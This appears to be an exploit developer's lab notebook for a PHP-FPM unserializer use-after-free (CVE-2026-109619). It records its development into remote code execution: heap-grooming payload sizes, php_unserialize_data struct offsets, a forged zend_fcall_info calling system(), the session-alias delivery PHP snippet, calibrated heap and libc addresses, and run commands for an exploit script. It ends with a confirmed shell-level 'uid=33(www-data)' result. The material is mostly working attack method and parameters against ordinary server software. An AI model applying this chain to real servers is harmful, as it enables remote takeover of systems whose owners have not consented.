# FPM2SHELL (CVE-2026-109619 unserializer path) — module 1+2 session, 2026-10-22

## Lab
- nginx:alpine -> php:8.3-fpm (Docker network f2snet), static pm, max_children=1
- memory_limit=16M, post_max_size=64M, max_input_vars=100000, upload_progress On
- App surface: `unserialize($_POST['data'])` post-startup (app/index.php line 7)

## SOLID results
1. Parse-phase vs decode-phase fatal separation (SOLID):
   - Fatals during multipart parse log "in Unknown on line 0" + `child exited
     with code 70` (FPM kills worker — that is the 109618 mod_php path, wrong
     window for FPM).
   - Fatals inside the decode log "...in /var/www/html/index.php on line 7"
     and return HTTP 500 with the worker ALIVE. This is the target window.
2. Payload that lands in-window (SOLID, reproducible):
   - `--pressure 0 --depth 8 --arrays 40000` (ltx_fpm2shell.py stage-a)
   - body 869KB; verdict FATAL-CANDIDATE; log: "tried to allocate 2097152
     bytes in /var/www/html/index.php on line 7".
   - Key payload facts:
     * `a:0:{}` decodes to the shared immutable empty-array singleton —
       NO allocation. Expansion payload must use `a:1:{i:0;i:1;}` 1-element
       arrays (~17B raw -> ~300B decoded HashTable+buckets+zval, ~17x).
     * Raw POST value residency counts against memory_limit during parse:
       large string payloads (6MB) fatal in the PARSER ("Unknown line 0"),
       not the decoder. Keep raw body < ~1MB; let DECODE do the expanding.
3. Worker survival + reuse (SOLID):
   - After in-decode fatal, same child (pid=20) served B requests.
   - memory_get_usage(true) post-fatal: 10MB reserved, decaying across
     requests (10M -> 8M -> 6M -> 4M -> 2M) — ZendMM kept dirty segments;
     the freed var_hash lives inside that reservation.
4. Stage-B plumbing (SOLID): fatal-A then upload-progress+reclaim multipart
   (PHPSESSID + PHP_SESSION_UPLOAD_PROGRESS + reclaim fields, same worker)
   returns 200 on the same pid. Chain transport works end to end.

## Next (module 2/3 — calibration)
- gdb in f2s-php: breakpoint php_var_unserialize_destroy; after fatal-A,
  inspect BG(unserialize).data/.level from request B; dump dtor block
  addresses + used_slots; map which multipart value bin (0x200/0x400/0x800)
  reclaims the freed var_hash.
- Then negative-used_slots forge: slot = block + 16 + 16*used_slots;
  duplicate serialized keys -> var_push_dtor_value ZVAL_COPY_VALUE into the
  pre-block slot -> forged zend_fcall_info -> zif_system (blob layout ported
  from ltx_php2shell.py, "system\0cmd" at +200).
- FPM caveat from 9bie/session evidence: session send_cookie semantics differ
  8.0-8.2 vs 8.3+ (early-return in reset_id on 8.3+ keeps send_cookie set).

## Run
  cd php2shell-lab/fpm-lab && ./run.sh        # lab up on :18120
  cd ../.. && python3 ltx_fpm2shell.py --url http://127.0.0.1:18120/index.php \
      -v stage-a --pressure 0 --depth 8 --arrays 40000
  python3 ltx_fpm2shell.py --url ... log      # fatal-location evidence

## CORRECTION (same day, critical)
The lab was running php:8.3-fpm = **8.3.36 — the PATCHED release** (built
Oct 21 2026). Every "state does not survive" measurement (F-06) was against
fixed code. Lab rebuilt on **php:8.3.35-fpm (vulnerable)**. Re-measured:

- F-06 is REFUTED for vulnerable builds.
- F-09 (SOLID, vulnerable 8.3.35): after the in-decode fatal, read directly at
  basic_globals+0x358/+0x360 while the worker was idle:
    BG data=0x7f886e26c000 level=1
  The dangling decoder state PERSISTS across requests. CVE-2026-109619
  primitive confirmed live, measured, not inferred.
- F-10 (SOLID): request B (upload-progress during body parse, pre-RINIT)
  consumes the stale decoder and SIGSEGVs the worker. Backtrace:
    #0 var_tmp_var  <- (*var_hashx)->last->data[used_slots]
    #1..5 unserializer
    #6 rfc1867_post_handler
    #7 sapi_handle_post
    #8 php_default_treat_data
    #10 zend_activate_auto_globals
    #11 php_hash_environment
  This is exactly the pre-RINIT reuse path. Crash = stale struct fields are
  garbage after reclaim (last pointer invalid). Next: shape B's multipart
  value allocations (bin matching sizeof(php_unserialize_data)) to plant a
  valid fake struct -> controlled walk -> dtor forge.

### Reclaim target (next calibration)
struct php_unserialize_data layout (8.3): last@+0, first_dtor@+8,
last_dtor@+16, allowed_classes@+24, ref_props@+32, cur_depth@+40,
max_depth@+48, entries@+56. `var_tmp_var` derefs last->data[used_slots]:
plant last = &entries (d+56) and entries.used_slots = 0.
d is emalloc(sizeof(struct)); sizeof = 56 + sizeof(var_entries).
Size determines the multipart value bin to reclaim it.

## Module 3 session 2 — gdb calibration (2026-10-22, later, PATCHED BUILD)
Harness: gdb -batch -p <worker> with breakpoints on php_var_unserialize (rcx =
var_hashx* -> data at +0) and php_var_unserialize_destroy (rdi). Container
needs --cap-add=SYS_PTRACE --security-opt seccomp=unconfined + gdb/procps.

### Findings
- F-06 (SOLID, negative result): fatal inside TOP-LEVEL app unserialize()
  on php:8.3-fpm does NOT persist decoder state. Trace: A entered with
  stack var_hashx=0x7ffd79e89580, data=0x7fa07f142000; NO destroy for that
  stack address ever fired (3 UNSERZ vs 0 stack DESTROY across A,B,B2 —
  var.c's destroy is inlined, invisible to the breakpoint), yet B's entry
  showed a FRESH heap pointer (0x7fa07f06f000) => BG(unserialize).level was
  reset between requests (basic RSHUTDOWN resets level without going through
  the exported destroy symbol). Dangling-pointer-at-entry did not happen.
- F-07 (SOLID): the reuse window therefore is NOT the top-level unserialize
  fatal. It must be the session-decode path (Calif's phpMyAdmin shape:
  fatal inside php_session_decode; the Session error handler cleans Session
  but not Basic's decoder state) or a NESTED decode (level>=2) where only
  the inner destroy is skipped.
- F-08 (tooling): breakpoint on exported symbols misses inlined call sites
  (var.c). Session-path probes work because session.c calls the exported
  destroy (heap var_hashx DESTROYs observed).

### Next experiment (module 3 continued) — session-decode fatal
1. Poison the session record via upload_progress key names (big progress
   record -> big serialized session payload).
2. A2: same sid; parse-phase pressure leaves heap just under limit at
   session_start; session decode of the big record crosses memory_limit ->
   fatal inside php_session_decode (log: "in Unknown on line 0" but FPM
   SURVIVES — post-startup fatal; distinguish from parse fatal by worker
   exit code 70 absence).
3. B: multipart w/ PHP_SESSION_UPLOAD_PROGRESS (pre-RINIT reuse) + reclaim
   shaping; gdb at B's UNSERZ must show A2's data pointer (reuse proof).
4. Then negative-used_slots forge (slot = block+16+16*used_slots).

---

## Module 3f/3g — session-value delivery over plain HTTP (LOCKED 2026-10-22)

### Result
Pure HTTP request sequence against the vulnerable app -> engine-level RCE:

```
store.php  : session value + alias  -> sess file
index.php A: app decode OOM         -> dangling php_unserialize_data at D
/index.php B: upload-progress decode -> R:1 -> fake ref -> system(cmd)
```

Proof: `/tmp/f2s_pwn` = `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
on the target.  5/5 runs (two with gdb observation, three pure HTTP).
Details, offsets, and evidence are in `CALIBRATION.md`.

### Delivery (replaces the raw session-file helper)
`app/store.php`:
```php
session_start();
$_SESSION['p'] = $_POST['p'];
$_SESSION['upload_progress_fk1'] = &$_SESSION['p'];
session_write_close();
```
The encoder writes:
`p|s:65500:"<payload>";upload_progress_fk1|R:1;` (65,537 bytes).
The `&` alias turns the `p` slot into a reference before encoding, so the
alias is `R:1` (not `R:2`); `R:1` -> id 0 -> the forged inline
`entries.data[0]` = V.  No `|`-key injection, no raw record writer.

### Heap geometry (constant for this master)
- D = 0x7f886e26c000 (stale decoder), file offset 0x1fe8 -> D because the
  read buffer base is D-0x2000 (`zend_string` header 0x18).
- payload prefix `p|s:65500:"` = 11 bytes -> fake struct at payload 0x1fdd.
- V/R/S/CMD at D+0x2100/0x2180/0x2200/0x2300.
- libc 0x7f886f06c000; system 0x7f886f0bf090.
- Stable across worker respawns (fork inherits master mappings); re-measure
  after a master/container restart.

### FPM leak negative (kills the 9bie ASLR stage port)
- Pre-RINIT OOM -> FPM child exit 70, worker state lost.
- Post-RINIT session OOM (huge id in `php_url_encode`) or uncaught exception
  in a user handler `open()` -> worker survives, but the session RSHUTDOWN
  runs: `PS(id)=0x0`, `PS(send_cookie)=1`.  No dangling id for B's END
  cleanup.  `PHP_RSHUTDOWN_FUNCTION(session)` calls
  `php_rshutdown_session_globals()` unconditionally, and
  `php_session_initialize()` sets status active before reset_id.
- `BG(unserialize)` persists (F-09), but `PS(id)` / `PS(http_session_vars)`
  do not.
- Consequence: the public Set-Cookie heap/libphp leak does not transfer to
  FPM.  The FPM chain requires calibrated addresses (lab) or an
  application-level info leak; this is the boundary between the current
  module and a fully remote FPM exploit.

### Evidence
`evidence/m3_app_gdb.out`, `evidence/m3_app_uid.txt`,
`evidence/m3_app_session.txt`, `evidence/m3_app_pure.out`,
`evidence/m3_app_pure2.out`, `evidence/leak_probe.txt`.
Probes: `app/leak_a.php`, `app/leak_x.php`, `app/leak_probe.php`,
`t_pre_oom.py`, `g_ps.gdb` (lab only).

